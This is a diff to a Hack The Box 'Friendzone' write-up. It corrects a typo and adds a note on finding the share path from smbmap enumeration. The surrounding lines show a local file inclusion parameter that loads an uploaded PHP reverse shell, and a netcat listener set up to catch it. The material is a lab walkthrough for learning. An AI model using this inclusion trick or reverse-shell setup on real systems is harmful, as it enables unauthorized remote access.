@@ -566,7 +566,11 @@ smb: \>
 ```
 
 
-And I found the path at `?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell` eventuall. Note the capitalized D in development. Took me a bit too long to figure that out.
+And I found the path at `?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell` eventually. Note the capitalized D in development. Took me a bit too long to figure that out.
+
+We already knew that it would probably be in "/etc/" from the smbmap enumeration:
+
+`        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files`
 
 ```
 kali@kali:~/htb/Friendzone$ sudo nc -nlvp 1337
